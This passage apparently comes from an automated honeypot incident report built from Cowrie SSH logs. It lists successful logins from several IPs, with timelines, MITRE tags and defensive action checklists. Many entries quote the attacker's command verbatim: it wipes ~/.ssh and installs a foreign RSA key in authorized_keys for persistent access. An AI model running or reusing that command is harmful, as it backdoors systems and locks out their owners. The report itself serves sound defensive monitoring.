| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:44:13` | `cowrie.session.connect` |
| `2026-05-26 12:44:13` | `cowrie.client.version` |
| `2026-05-26 12:44:13` | `cowrie.client.kex` |
| `2026-05-26 12:44:14` | `cowrie.login.success` |
| `2026-05-26 12:44:14` | `cowrie.session.params` |
| `2026-05-26 12:44:14` | `cowrie.command.input` |
| `2026-05-26 12:44:14` | `cowrie.command.failed` |
| `2026-05-26 12:44:15` | `cowrie.log.closed` |
| `2026-05-26 12:44:15` | `cowrie.session.params` |
| `2026-05-26 12:44:15` | `cowrie.command.input` |
| `2026-05-26 12:44:15` | `cowrie.session.file_download` |
| `2026-05-26 12:44:15` | `cowrie.log.closed` |
| `2026-05-26 12:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9476ae4ff0b8

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:44 |
| **Last Seen** | 2026-05-26 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:44:17` | `cowrie.session.connect` |
| `2026-05-26 12:44:17` | `cowrie.client.version` |
| `2026-05-26 12:44:17` | `cowrie.client.kex` |
| `2026-05-26 12:44:18` | `cowrie.login.success` |
| `2026-05-26 12:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e22e464278

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:44 |
| **Last Seen** | 2026-05-26 12:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:44:57` | `cowrie.session.connect` |
| `2026-05-26 12:44:57` | `cowrie.client.version` |
| `2026-05-26 12:44:57` | `cowrie.client.kex` |
| `2026-05-26 12:44:58` | `cowrie.login.success` |
| `2026-05-26 12:44:58` | `cowrie.session.params` |
| `2026-05-26 12:44:58` | `cowrie.command.input` |
| `2026-05-26 12:44:58` | `cowrie.command.failed` |
| `2026-05-26 12:44:59` | `cowrie.log.closed` |
| `2026-05-26 12:44:59` | `cowrie.session.params` |
| `2026-05-26 12:44:59` | `cowrie.command.input` |
| `2026-05-26 12:44:59` | `cowrie.session.file_download` |
| `2026-05-26 12:44:59` | `cowrie.log.closed` |
| `2026-05-26 12:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301a99ba8d8a

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:45 |
| **Last Seen** | 2026-05-26 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:45:01` | `cowrie.session.connect` |
| `2026-05-26 12:45:01` | `cowrie.client.version` |
| `2026-05-26 12:45:01` | `cowrie.client.kex` |
| `2026-05-26 12:45:02` | `cowrie.login.success` |
| `2026-05-26 12:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0efa1f6f4885

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:46 |
| **Last Seen** | 2026-05-26 12:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:46:28` | `cowrie.session.connect` |
| `2026-05-26 12:46:28` | `cowrie.client.version` |
| `2026-05-26 12:46:28` | `cowrie.client.kex` |
| `2026-05-26 12:46:28` | `cowrie.login.success` |
| `2026-05-26 12:46:29` | `cowrie.session.params` |
| `2026-05-26 12:46:29` | `cowrie.command.input` |
| `2026-05-26 12:46:29` | `cowrie.command.failed` |
| `2026-05-26 12:46:29` | `cowrie.log.closed` |
| `2026-05-26 12:46:29` | `cowrie.session.params` |
| `2026-05-26 12:46:29` | `cowrie.command.input` |
| `2026-05-26 12:46:29` | `cowrie.session.file_download` |
| `2026-05-26 12:46:29` | `cowrie.log.closed` |
| `2026-05-26 12:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-866900f54db9

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:46 |
| **Last Seen** | 2026-05-26 12:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:46:31` | `cowrie.session.connect` |
| `2026-05-26 12:46:31` | `cowrie.client.version` |
| `2026-05-26 12:46:32` | `cowrie.client.kex` |
| `2026-05-26 12:46:32` | `cowrie.login.success` |
| `2026-05-26 12:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa69a123cc9f

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:47 |
| **Last Seen** | 2026-05-26 12:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:47:13` | `cowrie.session.connect` |
| `2026-05-26 12:47:13` | `cowrie.client.version` |
| `2026-05-26 12:47:13` | `cowrie.client.kex` |
| `2026-05-26 12:47:14` | `cowrie.login.success` |
| `2026-05-26 12:47:14` | `cowrie.session.params` |
| `2026-05-26 12:47:14` | `cowrie.command.input` |
| `2026-05-26 12:47:14` | `cowrie.command.failed` |
| `2026-05-26 12:47:15` | `cowrie.log.closed` |
| `2026-05-26 12:47:15` | `cowrie.session.params` |
| `2026-05-26 12:47:15` | `cowrie.command.input` |
| `2026-05-26 12:47:15` | `cowrie.session.file_download` |
| `2026-05-26 12:47:15` | `cowrie.log.closed` |
| `2026-05-26 12:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a842e91cd0a5

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:47 |
| **Last Seen** | 2026-05-26 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:47:17` | `cowrie.session.connect` |
| `2026-05-26 12:47:17` | `cowrie.client.version` |
| `2026-05-26 12:47:17` | `cowrie.client.kex` |
| `2026-05-26 12:47:18` | `cowrie.login.success` |
| `2026-05-26 12:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4b6c75cf20

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:50 |
| **Last Seen** | 2026-05-26 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:50:56` | `cowrie.session.connect` |
| `2026-05-26 12:50:56` | `cowrie.client.version` |
| `2026-05-26 12:50:56` | `cowrie.client.kex` |
| `2026-05-26 12:50:56` | `cowrie.login.success` |
| `2026-05-26 12:50:57` | `cowrie.session.params` |
| `2026-05-26 12:50:57` | `cowrie.command.input` |
| `2026-05-26 12:50:57` | `cowrie.command.failed` |
| `2026-05-26 12:50:57` | `cowrie.log.closed` |
| `2026-05-26 12:50:57` | `cowrie.session.params` |
| `2026-05-26 12:50:57` | `cowrie.command.input` |
| `2026-05-26 12:50:57` | `cowrie.session.file_download` |
| `2026-05-26 12:50:57` | `cowrie.log.closed` |
| `2026-05-26 12:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93a97df1124

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-05-26 12:51 |
| **Last Seen** | 2026-05-26 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:51:00` | `cowrie.session.connect` |
| `2026-05-26 12:51:00` | `cowrie.client.version` |
| `2026-05-26 12:51:00` | `cowrie.client.kex` |
| `2026-05-26 12:51:00` | `cowrie.login.success` |
| `2026-05-26 12:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9af51b5a9ab

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 12:56 |
| **Last Seen** | 2026-05-26 12:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:56:27` | `cowrie.session.connect` |
| `2026-05-26 12:56:27` | `cowrie.client.version` |
| `2026-05-26 12:56:27` | `cowrie.client.kex` |
| `2026-05-26 12:56:28` | `cowrie.login.success` |
| `2026-05-26 12:56:28` | `cowrie.session.params` |
| `2026-05-26 12:56:28` | `cowrie.command.input` |
| `2026-05-26 12:56:28` | `cowrie.command.failed` |
| `2026-05-26 12:56:29` | `cowrie.log.closed` |
| `2026-05-26 12:56:29` | `cowrie.session.params` |
| `2026-05-26 12:56:29` | `cowrie.command.input` |
| `2026-05-26 12:56:29` | `cowrie.session.file_download` |
| `2026-05-26 12:56:29` | `cowrie.log.closed` |
| `2026-05-26 12:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d28c1342edf2

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 12:56 |
| **Last Seen** | 2026-05-26 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:56:32` | `cowrie.session.connect` |
| `2026-05-26 12:56:32` | `cowrie.client.version` |
| `2026-05-26 12:56:32` | `cowrie.client.kex` |
| `2026-05-26 12:56:33` | `cowrie.login.success` |
| `2026-05-26 12:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f789bd6c289d

| Field | Detail |
|---|---|
| **Source IP** | `187.33.251[.]218` |
| **First Seen** | 2026-05-26 12:57 |
| **Last Seen** | 2026-05-26 12:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:57:03` | `cowrie.session.connect` |
| `2026-05-26 12:57:03` | `cowrie.client.version` |
| `2026-05-26 12:57:03` | `cowrie.client.kex` |
| `2026-05-26 12:57:05` | `cowrie.login.success` |
| `2026-05-26 12:57:06` | `cowrie.session.params` |
| `2026-05-26 12:57:06` | `cowrie.command.input` |
| `2026-05-26 12:57:06` | `cowrie.command.failed` |
| `2026-05-26 12:57:06` | `cowrie.log.closed` |
| `2026-05-26 12:57:07` | `cowrie.session.params` |
| `2026-05-26 12:57:07` | `cowrie.command.input` |
| `2026-05-26 12:57:07` | `cowrie.session.file_download` |
| `2026-05-26 12:57:07` | `cowrie.log.closed` |
| `2026-05-26 12:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.251[.]218` to AbuseIPDB if not already reported
- [ ] Block `187.33.251[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5e82a9f6b0

| Field | Detail |
|---|---|
| **Source IP** | `187.33.251[.]218` |
| **First Seen** | 2026-05-26 12:57 |
| **Last Seen** | 2026-05-26 12:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 12:57:11` | `cowrie.session.connect` |
| `2026-05-26 12:57:11` | `cowrie.client.version` |
| `2026-05-26 12:57:11` | `cowrie.client.kex` |
| `2026-05-26 12:57:13` | `cowrie.login.success` |
| `2026-05-26 12:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.251[.]218` to AbuseIPDB if not already reported
- [ ] Block `187.33.251[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d7afe2003c

| Field | Detail |
|---|---|
| **Source IP** | `14.63.198[.]239` |
| **First Seen** | 2026-05-26 13:02 |
| **Last Seen** | 2026-05-26 13:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:02:57` | `cowrie.session.connect` |
| `2026-05-26 13:02:57` | `cowrie.client.version` |
| `2026-05-26 13:02:58` | `cowrie.client.kex` |
| `2026-05-26 13:02:58` | `cowrie.login.success` |
| `2026-05-26 13:02:58` | `cowrie.session.params` |
| `2026-05-26 13:02:58` | `cowrie.command.input` |
| `2026-05-26 13:02:58` | `cowrie.command.failed` |
| `2026-05-26 13:02:59` | `cowrie.log.closed` |
| `2026-05-26 13:02:59` | `cowrie.session.params` |
| `2026-05-26 13:02:59` | `cowrie.command.input` |
| `2026-05-26 13:02:59` | `cowrie.session.file_download` |
| `2026-05-26 13:02:59` | `cowrie.log.closed` |
| `2026-05-26 13:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.198[.]239` to AbuseIPDB if not already reported
- [ ] Block `14.63.198[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-165d7b9439b1

| Field | Detail |
|---|---|
| **Source IP** | `14.63.198[.]239` |
| **First Seen** | 2026-05-26 13:03 |
| **Last Seen** | 2026-05-26 13:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:03:01` | `cowrie.session.connect` |
| `2026-05-26 13:03:01` | `cowrie.client.version` |
| `2026-05-26 13:03:01` | `cowrie.client.kex` |
| `2026-05-26 13:03:02` | `cowrie.login.success` |
| `2026-05-26 13:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.198[.]239` to AbuseIPDB if not already reported
- [ ] Block `14.63.198[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4fab792490

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-26 13:15 |
| **Last Seen** | 2026-05-26 13:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:15:57` | `cowrie.session.connect` |
| `2026-05-26 13:15:57` | `cowrie.client.version` |
| `2026-05-26 13:15:57` | `cowrie.client.kex` |
| `2026-05-26 13:15:58` | `cowrie.login.success` |
| `2026-05-26 13:15:59` | `cowrie.session.params` |
| `2026-05-26 13:15:59` | `cowrie.command.input` |
